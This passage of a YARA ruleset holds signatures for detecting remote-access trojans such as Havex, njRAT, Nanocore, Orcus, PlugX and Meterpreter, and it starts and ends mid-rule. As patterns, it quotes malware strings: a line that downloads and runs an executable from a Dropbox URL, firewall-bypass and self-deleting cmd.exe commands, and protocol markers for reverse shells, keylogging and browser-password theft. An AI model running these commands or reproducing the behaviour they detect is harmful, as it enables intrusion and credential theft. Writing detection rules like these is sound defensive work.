sample_filetype = \"dll\"\nstrings:\n        $string0 = \"RichHa\"\n        $string1 = \"         (((((                  H\" wide\n        $string2 = \"1$1,141<1D1L1T1\\\\1d1l1t1\"\n        $string3 = \"<8;$O' \"\n        $string4 = \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]\"\n        $string5 = \"jYPQTVTSkllZTTXRTUiHceWda/\"\n        $string6 = \"urn:schemas-microsoft-com:asm.v1\"\n        $string7 = \"8.848H8O8i8s8y8\"\n        $string8 = \"wrapper3\" wide\n        $string9 = \"pwwwwwwww\"\n        $string10 = \"Sunday\"\n        $string11 = \"YYuTVWh\"\n        $string12 = \"DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN\"\n        $string13 = \"ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt\"\n        $string15 = \"wrapper3 Version 1.0\" wide\n        $string16 = \"77A779\"\n        $string17 = \"<C<G<M<R<X<\"\n        $string18 = \"9 9-9N9X9s9\"\ncondition:\n        18 of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as\n    long as you use it under this license.\n*/\nrule glassrat: RAT\n{\n   meta:\n        author = \"Brian Wallace @botnet_hunter\"\n   strings:\n    \t$a = \"PostQuitMessage\"\n        $b = \"pwlfnn10,gzg\"\n        $c = \"update.dll\"\n        $d = \"_winver\"\n   condition:\n    \tall of them\n\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\n\nrule Win32OPCHavex\n{\n    meta:\n        Author      = \"BAE Systems\"\n        Date        = \"2014/06/23\"\n        Description = \"Rule for identifying OPC version of HAVEX\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $mzhdr = \"MZ\"\n        $dll = \"7CFC52CD3F87.dll\"\n        $a1 = \"Start finging of LAN hosts...\" wide\n        $a2 = \"Finding was fault. Unexpective error\" wide\n        $a3 = \"Was found %i hosts in LAN:\" wide\n        $a4 = \"Hosts was't found.\" wide\n        $a5 = \"Start finging of OPC Servers...\" wide\n        $a6 = \"Was found %i OPC Servers.\" wide\n        $a7 = \"OPC Servers not found. Programm finished\" wide\n        $a8 = \"%s[%s]!!!EXEPTION %i!!!\" wide\n        $a9 = \"Start finging of OPC Tags...\" wide\n\n    condition:\n        $mzhdr at 0 and ($dll or (any of ($a*)))\n}\n\nrule Win32FertgerHavex\n{\n    meta:\n        Author      = \"BAE Systems\"\n        Date        = \"2014/06/23\"\n        Description = \"Rule for identifying Fertger version of HAVEX\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $mz = \"MZ\"\n        $a1=\"\\\\\\\\.\\\\pipe\\\\mypipe-f\" wide\n        $a2=\"\\\\\\\\.\\\\pipe\\\\mypipe-h\" wide\n        $a3=\"\\\\qln.dbx\" wide\n        $a4=\"*.yls\" wide\n        $a5=\"\\\\*.xmd\" wide\n        $a6=\"fertger\" wide\n        $a7=\"havex\"\n    \n    condition:\n        $mz at 0 and 3 of ($a*) \n}\n\nrule Havex_Trojan_PHP_Server\n{\n    meta:\n        Author      = \"Florian Roth\"\n        Date        = \"2014/06/24\"\n        Description = \"Detects the PHP server component of the Havex RAT\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $s1 = \"havex--></body></head>\"\n        $s2 = \"ANSWERTAG_START\"\n        $s3 = \"PATH_BLOCKFILE\"\n\n    condition:\n        all of them\n} \nrule SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump : memory\n\t{\n\tmeta:\n\t\tdescription = \"Detects Havex Windows process executable from memory dump\"\n\t\tdate = \"2015-12-2\"\n\t\tauthor = \"Chris Sistrunk\"\n\t\thash = \"8065674de8d79d1c0e7b3baf81246e7d\"\n\tstrings:\n\t\t$magic = { 4d 5a }\t\n\t\n\t        $s1 = \"~tracedscn.yls\" fullword wide\n\t\t$s2 = \"[!]Start\" fullword wide\n\t\t$s3 = \"[+]Get WSADATA\" fullword wide\n\t\t$s4 = \"[-]Can not get local ip\" fullword wide\n\t\t$s5 = \"[+]Local:\" fullword wide\n\t\t$s6 = \"[-]Threads number > Hosts number\" fullword wide\n\t\t$s7 = \"[-]Connection error\" fullword wide\n\t\t\n\t\t$x1 = \"bddd4e2b84fa2ad61eb065e7797270ff.exe\" fullword wide\n\tcondition:\n\t    $magic at 0 and ( 3 of ($s*) or $x1 )\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule apt_win32_dll_rat_hiZor_RAT: RAT\n{\n\tmeta:\n    description = \"Detects hiZor RAT\"\n\t\thash1 = \"75d3d1f23628122a64a2f1b7ef33f5cf\"\n\t\thash2 = \"d9821468315ccd3b9ea03161566ef18e\"\n\t\thash3 = \"b9af5f5fd434a65d7aa1b55f5441c90a\"\n    ref1 = \"http://www.threatgeek.com/2016/01/introducing-hi-zor-rat.html\"\n    ref2 = \"https://github.com/Neo23x0/Loki/blob/b187ed063d73d0defc6958100ca7ad04aa77fc12/signatures/apt_hizor_rat.yar\"\n    reference = \"https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf\"\n\tstrings:\n\t\t// Part of the encoded User-Agent = Mozilla\n\t\t$s1 = { c7 [5] 40 00 62 00 c7 [5] 77 00 64 00 c7 [5] 61 00 61 00 c7 [5] 6c 00 }\n\n\t\t// XOR to decode User-Agent after string stacking 0x10001630\n\t\t$s2 = { 66 [7] 0d 40 83 ?? ?? 7c ?? }\n\n\t\t// XOR with 0x2E - 0x10002EF6\n\t\t$s3 = { 80 [2] 2e 40 3b ?? 72 ?? }\n\n\t\t$s4 = \"CmdProcessExited\" wide ascii\n\t\t$s5 = \"rootDir\" wide ascii\n\t\t$s6 = \"DllRegisterServer\" wide ascii\n\t\t$s7 = \"GetNativeSystemInfo\" wide ascii\n\t\t$s8 = \"%08x%08x%08x%08x\" wide ascii\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2015-10-01\n\tIdentifier: Indetectables RAT\n*/\n\nrule Indetectables_RAT: RAT {\n\tmeta:\n\t\tdescription = \"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105\"\n\t\thash2 = \"66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229\"\n\t\thash3 = \"1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801\"\n\tstrings:\n\t\t$s1 = \"Coded By M3\" fullword wide\n\t\t$s2 = \"Stub Undetector M3\" fullword wide\n\t\t$s3 = \"www.webmenegatti.com.br\" wide\n\t\t$s4 = \"M3n3gatt1\" fullword wide\n\t\t$s5 = \"TheMisterFUD\" fullword wide\n\t\t$s6 = \"KillZoneKillZoneKill\" fullword ascii\n\t\t$s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n\t\t$s8 = \"M3_F_U_D_M3\" ascii\n\t\t$s9 = \"M3n3gatt1hack3r\" fullword wide\n\t\t$s9a = \"M3n3gatt1hack3r\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 1 of them\n}\n\nrule BergSilva_Malware : RAT {\n\tmeta:\n\t\tdescription = \"Detects a malware from the same author as the Indetectables RAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e\"\n\t\thash2 = \"6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc\"\n\tstrings:\n\t\t$x1 = \"C:\\\\Users\\\\Berg Silva\\\\Desktop\\\\\" wide\n\t\t$x2 = \"URLDownloadToFileA 0, \\\"https://dl.dropbox.com/u/105015858/nome.exe\\\", \\\"c:\\\\nome.exe\\\", 0, 0\" fullword wide\n\n\t\t$s1 = \" Process.Start (Path.GetTempPath() & \\\"name\\\" & \\\".exe\\\") 'start server baixado\" fullword wide\n\t\t$s2 = \"FileDelete(@TempDir & \\\"\\\\nome.exe\\\") ;Deleta o Arquivo para que possa ser executado normalmente\" fullword wide\n\t\t$s3 = \" Lib \\\"\\\\WINDOWS\\\\system32\\\\UsEr32.dLl\\\"\" fullword wide\n\t\t$s4 = \"$Directory = @TempDir & \\\"\\\\nome.exe\\\" ;Define a variavel\" fullword wide\n\t\t$s5 = \"https://dl.dropbox.com/u/105015858\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule apt_win32_dll_rat_1a53b0cp32e46g0qio7\n{\n\tmeta:\n\t\tauthor = \"https://www.fidelissecurity.com/\"\n        \tinfo = \"Indicators for FTA-1020\"\n\t\thash1 = \"75d3d1f23628122a64a2f1b7ef33f5cf\"\n\t\thash2 = \"d9821468315ccd3b9ea03161566ef18e\"\n\t\thash3 = \"b9af5f5fd434a65d7aa1b55f5441c90a\"\n\t\treference = \"https://github.com/fideliscyber\"\n\tstrings:\n    \t// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko\n\t\t$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59 00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00 39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22 00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00 c7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7 [2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566\n\t// Software\\Microsoft\\Windows\\CurrentVersion\\Run\n       $ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24 00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00 66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00 00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00 c7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09\n\t$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? }\n       // xor\t\tword ptr [ebp+eax*2+var_5C], 14h\n\t// inc\t\teax\n\t// cmp     \teax, 14h\n       // Loop to decode a static string. It reveals the \"1a53b0cp32e46g0qio9\" static string sent in the beacon\n\t$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0\n\t$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621\n\t$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640\n\t$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } //  10003930\n\t$ = \"%08x%08x%08x%08x\" wide ascii\n\t$ = \"WinHttpGetIEProxyConfigForCurrentUser\" wide ascii\n\n\tcondition:\n\t(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule Meterpreter_Reverse_Tcp { \n  meta: // This is the standard backdoor/RAT from Metasploit, could be used by any actor \n    author = \"chort (@chort0)\" \n    description = \"Meterpreter reverse TCP backdoor in memory. Tested on Win7x64.\" \n  strings: \n    $a = { 4d 45 54 45 52 50 52 45 54 45 52 5f 54 52 41 4e 53 50 4f 52 54 5f 53 53 4c [32-48] 68 74 74 70 73 3a 2f 2f 58 58 58 58 58 58 } // METERPRETER_TRANSPORT_SSL \u2026 https://XXXXXX \n    $b = { 4d 45 54 45 52 50 52 45 54 45 52 5f 55 41 } // METERPRETER_UA \n    $c = { 47 45 54 20 2f 31 32 33 34 35 36 37 38 39 20 48 54 54 50 2f 31 2e 30 } // GET /123456789 HTTP/1.0 \n    $d = { 6d 65 74 73 72 76 2e 64 6c 6c [2-4] 52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72 } // metsrv.dll \u2026 ReflectiveLoader \n    \n  condition: \n    $a or (any of ($b, $d) and $c) \n  }\n\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule Nanocore_RAT_Gen_1 {\n\tmeta:\n\t\tdescription = \"Detetcs the Nanocore RAT and similar malware\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\tscore = 70\n\t\thash1 = \"e707a7745e346c5df59b5aa4df084574ae7c204f4fb7f924c0586ae03b79bf06\"\n\tstrings:\n\t\t$x1 = \"C:\\\\Users\\\\Logintech\\\\Dropbox\\\\Projects\\\\New folder\\\\Latest\\\\Benchmark\\\\Benchmark\\\\obj\\\\Release\\\\Benchmark.pdb\" fullword ascii\n\t\t$x2 = \"RunPE1\" fullword ascii\n\t\t$x3 = \"082B8C7D3F9105DC66A7E3267C9750CF43E9D325\" fullword ascii\n\t\t$x4 = \"$374e0775-e893-4e72-806c-a8d880a49ae7\" fullword ascii\n\t\t$x5 = \"Monitorinjection\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )\n}\n\nrule Nanocore_RAT_Gen_2 {\n\tmeta:\n\t\tdescription = \"Detetcs the Nanocore RAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 100\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash1 = \"755f49a4ffef5b1b62f4b5a5de279868c0c1766b528648febf76628f1fe39050\"\n\tstrings:\n\t\t$x1 = \"NanoCore.ClientPluginHost\" fullword ascii\n\t\t$x2 = \"IClientNetworkHost\" fullword ascii\n\t\t$x3 = \"#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or ( all of them )\n}\n\nrule Nanocore_RAT_Sample_1 {\n\tmeta:\n\t\tdescription = \"Detetcs a certain Nanocore RAT sample\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 75\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash2 = \"b7cfc7e9551b15319c068aae966f8a9ff563b522ed9b1b42d19c122778e018c8\"\n\tstrings:\n\t\t$x1 = \"TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK\" fullword wide\n\t\t$x2 = \"1EF0D55861681D4D208EC3070B720C21D885CB35\" fullword ascii\n\t\t$x3 = \"popthatkitty.Resources.resources\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) ) ) or ( all of them )\n}\n\nrule Nanocore_RAT_Sample_2 {\n\tmeta:\n\t\tdescription = \"Detetcs a certain Nanocore RAT sample\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 75\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash1 = \"51142d1fb6c080b3b754a92e8f5826295f5da316ec72b480967cbd68432cede1\"\n\tstrings:\n\t\t$s1 = \"U4tSOtmpM\" fullword ascii\n\t\t$s2 = \")U71UDAU_QU_YU_aU_iU_qU_yU_\" fullword wide\n\t\t$s3 = \"Cy4tOtTmpMtTHVFOrR\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and all of ($s*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\nrule NetWiredRC_B : RAT\n{\n\tmeta:\n\t\tdescription = \"NetWiredRC\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2014-12-23\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.1\" \n\n\tstrings:\n\t\t$mutex = \"LmddnIkX\"\n\n\t\t$str1 = \"%s.Identifier\"\n\t\t$str2 = \"%d:%I64u:%s%s;\"\n\t\t$str3 = \"%s%.2d-%.2d-%.4d\"\n\t\t$str4 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\"\n\t\t$str5 = \"%.2d/%.2d/%d %.2d:%.2d:%.2d\"\n\t\t\n\t\t$klg1 = \"[Backspace]\"\n\t\t$klg2 = \"[Enter]\"\n\t\t$klg3 = \"[Tab]\"\n\t\t$klg4 = \"[Arrow Left]\"\n\t\t$klg5 = \"[Arrow Up]\"\n\t\t$klg6 = \"[Arrow Right]\"\n\t\t$klg7 = \"[Arrow Down]\"\n\t\t$klg8 = \"[Home]\"\n\t\t$klg9 = \"[Page Up]\"\n\t\t$klg10 = \"[Page Down]\"\n\t\t$klg11 = \"[End]\"\n\t\t$klg12 = \"[Break]\"\n\t\t$klg13 = \"[Delete]\"\n\t\t$klg14 = \"[Insert]\"\n\t\t$klg15 = \"[Print Screen]\"\n\t\t$klg16 = \"[Scroll Lock]\"\n\t\t$klg17 = \"[Caps Lock]\"\n\t\t$klg18 = \"[Alt]\"\n\t\t$klg19 = \"[Esc]\"\n\t\t$klg20 = \"[Ctrl+%c]\"\n\n\tcondition: \n\t\t$mutex or (1 of ($str*) and 1 of ($klg*))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule Njrat: RAT\n{\n    meta:\n        description = \"Njrat\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /(F)romBase64String/\n        $string2 = /(B)ase64String/\n        $string3 = /(C)onnected/ wide ascii\n        $string4 = /(R)eceive/\n        $string5 = /(S)end/ wide ascii\n        $string6 = /(D)ownloadData/ wide ascii\n        $string7 = /(D)eleteSubKey/ wide ascii\n        $string8 = /(g)et_MachineName/\n        $string9 = /(g)et_UserName/\n        $string10 = /(g)et_LastWriteTime/\n        $string11 = /(G)etVolumeInformation/\n        $string12 = /(O)SFullName/ wide ascii\n        $string13 = /(n)etsh firewall/ wide\n        $string14 = /(c)md\\.exe \\/k ping 0 & del/ wide\n        $string15 = /(c)md\\.exe \\/c ping 127\\.0\\.0\\.1 & del/ wide\n        $string16 = /(c)md\\.exe \\/c ping 0 -n 2 & del/ wide\n        $string17 = {7C 00 27 00 7C 00 27 00 7C}\n\n    condition:\n        10 of them\n}\nrule njrat1: RAT\n{\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2015-05-27\"\n        description = \"Identify njRat\"\n    strings:\n        $a1 = \"netsh firewall add allowedprogram \" wide\n        $a2 = \"SEE_MASK_NOZONECHECKS\" wide\n\n        $b1 = \"[TAP]\" wide\n        $b2 = \" & exit\" wide\n\n        $c1 = \"md.exe /k ping 0 & del \" wide\n        $c2 = \"cmd.exe /c ping 127.0.0.1 & del\" wide\n        $c3 = \"cmd.exe /c ping\" wide\n    condition:\n        1 of ($a*) and 1 of ($b*) and 1 of ($c*)\n}\nrule win_exe_njRAT \n{\nmeta:\nauthor = \"info@fidelissecurity.com\"\ndescripion = \"njRAT - Remote Access Trojan\"\ncomment = \"Variants have also been observed obfuscated with .NET Reactor\"\nfiletype = \"pe\"\ndate = \"2013-07-15\"\nversion = \"1.0\"\nhash1 = \"92ee1fb5df21d8cfafa2b02b6a25bd3b\"\nhash2 = \"3576d40ce18bb0349f9dfa42b8911c3a\"\nhash3 = \"24cc5b811a7f9591e7f2cb9a818be104\"\nhash4 = \"3ad5fded9d7fdf1c2f6102f4874b2d52\"\nhash5 = \"a98b4c99f64315aac9dd992593830f35\"\nhash6 =\"5fcb5282da1a2a0f053051c8da1686ef\"\nhash7 = \"a669c0da6309a930af16381b18ba2f9d\"\nhash8 = \"79dce17498e1997264346b162b09bde8\"\nhash9 = \"fc96a7e27b1d3dab715b2732d5c86f80\"\nref1 = \"http://bit.ly/19tlf4s\"\nref2 = \"http://www.fidelissecurity.com/threatadvisory\"\nref3 = \"http://www.threatgeek.com/2013/06/fidelis-threat-advisory-1009-njratuncovered.html\"\nref4 = \"http://threatgeek.typepad.com/files/fta-1009---njrat-uncovered.pdf\"\n\nstrings:\n$magic = \"MZ\"\n$string_setA_1 = \"FromBase64String\"\n$string_setA_2 = \"Base64String\"\n$string_setA_3 = \"Connected\" wide ascii\n$string_setA_4 = \"Receive\"\n$string_setA_5 = \"DeleteSubKey\" wide ascii\n$string_setA_6 = \"get_MachineName\"\n$string_setA_7 = \"get_UserName\"\n$string_setA_8 = \"get_LastWriteTime\"\n$string_setA_9 = \"GetVolumeInformation\"\n\n$string_setB_1 = \"OSFullName\" wide ascii\n$string_setB_2 = \"Send\" wide ascii\n$string_setB_3 = \"Connected\" wide ascii\n$string_setB_4 = \"DownloadData\" wide ascii\n$string_setB_5 = \"netsh firewall\" wide\n$string_setB_6 = \"cmd.exe /k ping 0 & del\" wide\n\ncondition:\n($magic at 0) and ( all of ($string_setA*) or all of ($string_setB*) ) \n}\n\nrule network_traffic_njRAT \n{\nmeta:\nauthor = \"info@fidelissecurity.com\"\ndescripion = \"njRAT - Remote Access Trojan\"\ncomment = \"Rule to alert on network traffic indicators\"\nfiletype = \"PCAP - Network Traffic\"\ndate = \"2013-07-15\"\nversion = \"1.0\"\nhash1 = \"92ee1fb5df21d8cfafa2b02b6a25bd3b\"\nhash2 =\"3576d40ce18bb0349f9dfa42b8911c3a\"\nhash3 =\"24cc5b811a7f9591e7f2cb9a818be104\"\nhash4 = \"3ad5fded9d7fdf1c2f6102f4874b2d52\"\nhash5 = \"a98b4c99f64315aac9dd992593830f35\"\nhash6 = \"5fcb5282da1a2a0f053051c8da1686ef\"\nhash7 = \"a669c0da6309a930af16381b18ba2f9d\"\nhash8 = \"79dce17498e1997264346b162b09bde8\"\nhash9 = \"fc96a7e27b1d3dab715b2732d5c86f80\"\nref1 = \"http://bit.ly/19tlf4s\"\nref2 = \"http://www.fidelissecurity.com/threatadvisory\"\nref3 = \"http://www.threatgeek.com/2013/06/fidelis-threat-advisory-1009-njrat-uncovered.html\"\nref4 = \"http://threatgeek.typepad.com/files/fta-1009---njrat-uncovered.pdf\"\n\nstrings:\n$string1 = \"FM|'|'|\"     // File Manager\n$string2 = \"nd|'|'|\"     // File Manager\n$string3 = \"rn|'|'|\"      // Run File\n$string4 = \"sc~|'|'|\"     // Remote Desktop\n$string5 = \"scPK|'|'|\"     // Remote Desktop\n$string6 = \"CAM|'|'|\"     // Remote Cam\n$string7 = \"USB Video Device[endof]\" // Remote Cam\n$string8 = \"rs|'|'|\"     // Reverse Shell\n$string9 = \"proc|'|'|\"     // Process Manager\n$string10 = \"k|'|'|\"     // Process Manager\n$string11 = \"RG|'|'|~|'|'|\"    // Registry Manipulation\n$string12 = \"kl|'|'|\"     // Keylogger file\n$string13 = \"ret|'|'|\"     // Get Browser Passwords\n$string14 = \"pl|'|'|\"     // Get Browser Passwords\n$string15 = \"lv|'|'|\"     // General\n$string16 = \"prof|'|'|~|'|'|\"   // Server rename\n$string17 = \"un|'|'|~[endof]\"   // Uninstall\n$idle_string = \"P[endof]\"    // Idle Connection\n\ncondition:\nany of ($string*) or #idle_string > 4  \n\n}\n\nrule RAT_Orcus \n{\n\n    meta:\n        author = \" J from THL <j@techhelplist.com> with thx to MalwareHunterTeam\"\n        date = \"2017/01\"\n        reference = \"https://virustotal.com/en/file/0ef747363828342c184303f2d6fbead054200e9c223e5cfc4777cda03006e317/analysis/\"\n        version = 1\n        maltype = \"RAT\"\n        filetype = \"memory\"\n\n    strings:\n        $text01 = \"Orcus.CommandManagement\"\n        $text02 = \"Orcus.Commands.\"\n        $text03 = \"Orcus.Config.\"\n        $text04 = \"Orcus.Connection.\"\n        $text05 = \"Orcus.Core.\"\n        $text06 = \"Orcus.exe\"\n        $text07 = \"Orcus.Extensions.\"\n        $text08 = \"Orcus.InstallationPromptForm\"\n        $text09 = \"Orcus.MainForm.\"\n        $text10 = \"Orcus.Native.\"\n        $text11 = \"Orcus.Plugins.\"\n        $text12 = \"orcus.plugins.dll\"\n        $text13 = \"Orcus.Properties.\"\n        $text14 = \"Orcus.Protection.\"\n        $text15 = \"Orcus.Share.\"\n        $text16 = \"Orcus.Shared\"\n        $text17 = \"Orcus.StaticCommands\"\n        $text18 = \"Orcus.Utilities.\"\n        $text19 = \"\\\\Projects\\\\Orcus\\\\Source\\\\Orcus.\"\n        $text20 = \".orcus.plugins.dll.zip\"\n        $text21 = \".orcus.shared.dll.zip\"\n        $text22 = \".orcus.shared.utilities.dll.zip\"\n        $text23 = \".orcus.staticcommands.dll.zip\"\n        $text24 = \"HvncCommunication\"\n        $text25 = \"HvncAction\"\n        $text26 = \"hvncDesktop\"\n        $text27 = \".InstallationPromptForm\"\n        $text28 = \"RequestKeyLogCommand\"\n        $text29 = \"get_KeyLogFile\"\n        $text30 = \"LiveKeyloggerCommand\"\n        $text31 = \"ORCUS.STATICCOMMANDS, VERSION=\"\n        $text32 = \"PrepareOrcusFileToRemove\"\n        $text33 = \"ConvertFromOrcusValueKind\"\n\n    condition:\n        13 of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule PlugXStrings : PlugX Family\n{\n    meta:\n        description = \"PlugX Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-12\"\n        \n    strings:\n        $BootLDR = \"boot.ldr\" wide ascii\n        $Dwork = \"d:\\\\work\" nocase\n        $Plug25 = \"plug2.5\"\n        $Plug30 = \"Plug3.0\"\n        $Shell6 = \"Shell6\"\n      \n    condition:\n        $BootLDR or ($Dwork and ($Plug25 or $Plug30 or $Shell6))\n}\n\nrule plugX : rat\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"PlugX RAT\"\n\t\tdate = \"2014-05-13\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://github.com/mattulm/IR-things/blob/master/volplugs/plugx.py\"\n\t\t\n\tstrings:\n\t\t$v1a = { 47 55 4C 50 00 00 00 00 }\n\t\t$v1b = \"/update?id=%8.8x\" \n\t\t$v1algoa = { BB 33 33 33 33 2B } \n\t\t$v1algob = { BB 44 44 44 44 2B } \n\t\t$v2a = \"Proxy-Auth:\" \n\t\t$v2b = { 68 A0 02 00 00 } \n\t\t$v2k = { C1 8F 3A 71 } \n\t\t\n\tcondition: \n\t\t$v1a at 0 or $v1b or (($v2a or $v2b) and (($v1algoa and $v1algob) or $v2k))\n}\n\nrule PlugX_mw\n{ \n\tmeta:\n\t\tmaltype = \"plugX\"\n\t\tauthor = \"https://github.com/reed1713\"\n\t\treference = \"http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html\"\n\t\tdescription = \"Malware creates a randomized directory within the appdata roaming directory and launches the malware. Should see multiple events for create process rundll32.exe and iexplorer.exe as it repeatedly uses iexplorer to launch the rundll32 